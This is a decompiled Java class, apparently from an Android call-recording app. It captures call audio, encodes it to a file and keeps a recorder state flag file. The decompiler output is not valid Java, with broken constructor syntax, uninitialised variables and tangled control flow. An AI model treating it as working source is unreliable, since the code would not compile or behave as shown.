package com.krecorder.call.callrecorder;

import android.content.Context;
import android.os.Build.VERSION;
import android.os.Handler;
import android.os.Looper;
import com.krecorder.call.recording.MediaFormat;
import com.krecorder.encoder.AudioEncoderBase;
import com.vvt.io.d;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;

public class o
  implements m
{
  private static final boolean a = com.vvt.ak.a.e;
  private static final boolean b = com.vvt.ak.a.a;
  private n c;
  private Context d;
  private e e;
  private String f;
  private j g;
  private File h;
  private FileOutputStream i;
  private u j;
  private t k;
  private int l;
  private int m;
  private AudioEncoderBase n;
  private boolean o;
  private final Object p;
  private boolean q;
  private boolean r;
  private int s;
  private int t;
  private String u;
  
  public o(Context paramContext, boolean paramBoolean, String paramString)
  {
    Object localObject = new java/lang/Object;
    localObject.<init>();
    this.p = localObject;
    this.f = "Unknown Error";
    this.m = i1;
    this.d = paramContext;
    this.i = null;
    this.e = null;
    this.l = 0;
    this.j = null;
    this.k = null;
    this.h = null;
    this.o = paramBoolean;
    this.t = i1;
    this.s = 0;
    this.q = false;
    this.r = false;
    this.u = paramString;
  }
  
  private void a(String paramString, boolean paramBoolean)
  {
    String str = "StdRecorderStateFlag.dat";
    for (;;)
    {
      try
      {
        str = com.vvt.io.p.a(paramString, str);
        boolean bool1 = b;
        if ((!bool1) || (paramBoolean))
        {
          localObject = new java/io/FileWriter;
          File localFile = new java/io/File;
          localFile.<init>(str);
          ((FileWriter)localObject).<init>(localFile);
          str = String.valueOf(paramBoolean);
          ((FileWriter)localObject).write(str);
          ((FileWriter)localObject).close();
          return;
        }
      }
      catch (IOException localIOException)
      {
        Object localObject;
        boolean bool2 = b;
        if (!bool2) {
          continue;
        }
        continue;
      }
      localObject = new java/io/File;
      ((File)localObject).<init>(str);
      ((File)localObject).delete();
      bool2 = b;
      if (!bool2) {}
    }
  }
  
  private void a(byte[] paramArrayOfByte, int paramInt)
  {
    Object localObject = this.n;
    if (localObject != null)
    {
      localObject = this.i;
      if (localObject != null)
      {
        localObject = new byte[paramInt];
        int i1 = paramArrayOfByte.length;
        if (i1 > paramInt)
        {
          boolean bool = b;
          if (!bool) {}
        }
        AudioEncoderBase localAudioEncoderBase = this.n;
        int i2 = localAudioEncoderBase.encode(paramArrayOfByte, (byte[])localObject);
        if (i2 > 0)
        {
          FileOutputStream localFileOutputStream = this.i;
          localFileOutputStream.write((byte[])localObject, 0, i2);
        }
      }
    }
  }
  
  public static boolean a(String paramString)
  {
    String str = com.vvt.io.p.a(paramString, "StdRecorderStateFlag.dat");
    boolean bool1 = d.f(str);
    boolean bool2 = b;
    if ((!bool2) || (bool1))
    {
      bool1 = false;
      str = null;
    }
    for (;;)
    {
      return bool1;
      bool1 = true;
    }
  }
  
  private void i()
  {
    boolean bool1 = b;
    if (bool1) {}
    try
    {
      Object localObject1 = this.n;
      if (localObject1 != null)
      {
        localObject1 = this.i;
        if (localObject1 != null)
        {
          localObject1 = this.n;
          bool1 = ((AudioEncoderBase)localObject1).canFlush();
          if (bool1)
          {
            int i1 = 8192;
            localObject1 = new byte[i1];
            localAudioEncoderBase2 = this.n;
            int i2 = localAudioEncoderBase2.flush((byte[])localObject1);
            if (i2 > 0)
            {
              FileOutputStream localFileOutputStream = this.i;
              localFileOutputStream.write((byte[])localObject1, 0, i2);
            }
          }
        }
      }
      localObject1 = this.n;
      if (localObject1 != null)
      {
        localObject1 = this.n;
        ((AudioEncoderBase)localObject1).close();
        this.n = null;
      }
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = a;
        if (bool2) {}
        AudioEncoderBase localAudioEncoderBase1 = this.n;
        if (localAudioEncoderBase1 != null)
        {
          localAudioEncoderBase1 = this.n;
          localAudioEncoderBase1.close();
          this.n = null;
        }
      }
    }
    finally
    {
      AudioEncoderBase localAudioEncoderBase2 = this.n;
      if (localAudioEncoderBase2 != null)
      {
        localAudioEncoderBase2 = this.n;
        localAudioEncoderBase2.close();
        this.n = null;
      }
    }
  }
  
  public void a(int paramInt)
  {
    Handler localHandler = new android/os/Handler;
    Object localObject = this.d.getMainLooper();
    localHandler.<init>((Looper)localObject);
    localObject = new com/krecorder/call/callrecorder/q;
    ((q)localObject).<init>(this, paramInt);
    localHandler.post((Runnable)localObject);
  }
  
  public void a(n paramn)
  {
    this.c = paramn;
    Thread localThread = new java/lang/Thread;
    p localp = new com/krecorder/call/callrecorder/p;
    localp.<init>(this);
    localThread.<init>(localp);
    localThread.start();
  }
  
  public void a(String paramString1, String paramString2, MediaFormat paramMediaFormat, int paramInt)
  {
    j localj = this.g;
    if (localj == null)
    {
      localj = new com/krecorder/call/callrecorder/j;
      localj.<init>();
      this.g = localj;
    }
    this.g.a(paramString1);
    this.g.b(paramString2);
    this.g.b(paramMediaFormat);
    this.g.b(paramInt);
  }
  
  public boolean a()
  {
    int i1 = 16;
    int i2 = 1;
    Object localObject1 = new com/krecorder/call/callrecorder/e;
    Object localObject2 = this.g;
    int i3 = ((j)localObject2).a();
    MediaFormat localMediaFormat = this.g.b();
    ((e)localObject1).<init>(i3, localMediaFormat);
    this.e = ((e)localObject1);
    try
    {
      localObject1 = this.g;
      int i4 = ((j)localObject1).a();
      i3 = 100;
      if (i4 != i3) {
        break label116;
      }
      i4 = 1;
      boolean bool = a.a(i4);
      if (bool) {
        break label216;
      }
      localObject3 = new java/lang/Exception;
      localObject1 = "Failed to set mixer parameters";
      ((Exception)localObject3).<init>((String)localObject1);
      throw ((Throwable)localObject3);
    }
    catch (Exception localException)
    {
      Object localObject3 = localException.getMessage();
      this.f = ((String)localObject3);
      i2 = 0;
      localObject3 = null;
    }
    return i2;
    label116:
    localObject1 = this.g;
    int i5 = ((j)localObject1).a();
    i3 = 6;
    if (i5 == i3)
    {
      i5 = Build.VERSION.SDK_INT;
      if (i5 >= i1) {
        i5 = i2;
      }
    }
    for (;;)
    {
      localObject2 = this.e;
      ((e)localObject2).a(i5);
      localObject1 = this.g;
      localObject2 = this.g;
      localObject2 = ((j)localObject2).b();
      int i7 = 1;
      e locale = this.e;
      i1 = locale.a();
      int i8 = 16;
      ((j)localObject1).a((MediaFormat)localObject2, i7, i1, i8);
      break;
      label216:
      int i6 = 0;
      localObject1 = null;
    }
  }
  
  public void b(int paramInt)
  {
    this.s = paramInt;
  }
  
  public boolean b()
  {
    e locale = this.e;
    boolean bool;
    if (locale != null)
    {
      locale = this.e;
      bool = locale.e();
      if (bool) {
        bool = true;
      }
    }
    for (;;)
    {
      return bool;
      bool = false;
      locale = null;
    }
  }
  
  public String c()
  {
    return this.f;
  }
  
  public void c(int paramInt)
  {
    this.t = paramInt;
  }
  
  public void d()
  {
    int i1 = 0;
    r localr = null;
    i();
    Object localObject = this.i;
    if (localObject != null) {}
    try
    {
      localObject = this.i;
      ((FileOutputStream)localObject).close();
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        boolean bool1;
        bool2 = a;
        if (!bool2) {}
      }
    }
    localObject = this.e;
    if (localObject != null)
    {
      localObject = this.e;
      bool1 = ((e)localObject).e();
      if (!bool1) {}
    }
    try
    {
      localObject = this.e;
      ((e)localObject).d();
    }
    catch (Exception localException)
    {
      for (;;)
      {
        int i2;
        boolean bool2 = a;
        if (!bool2) {}
      }
    }
    localObject = this.e;
    ((e)localObject).f();
    this.e = null;
    localObject = this.j;
    if (localObject != null)
    {
      localObject = this.j;
      ((u)localObject).quit();
      this.j = null;
      this.k = null;
    }
    localObject = this.g;
    i2 = ((j)localObject).a();
    i1 = 100;
    if (i2 == i1)
    {
      localObject = new java/lang/Thread;
      localr = new com/krecorder/call/callrecorder/r;
      localr.<init>(this);
      ((Thread)localObject).<init>(localr);
      ((Thread)localObject).start();
    }
  }
  
  public void e()
  {
    bool = b;
    if (bool) {}
    Object localObject = this.h;
    if (localObject != null)
    {
      localObject = this.h;
      bool = ((File)localObject).exists();
      if (bool)
      {
        localObject = this.i;
        if (localObject == null) {}
      }
    }
    try
    {
      localObject = this.i;
      ((FileOutputStream)localObject).close();
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        bool = a;
        if (!bool) {}
      }
    }
    this.i = null;
    localObject = this.h;
    ((File)localObject).delete();
    this.h = null;
  }
  
  public j f()
  {
    return this.g;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/krecorder/call/callrecorder/o.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */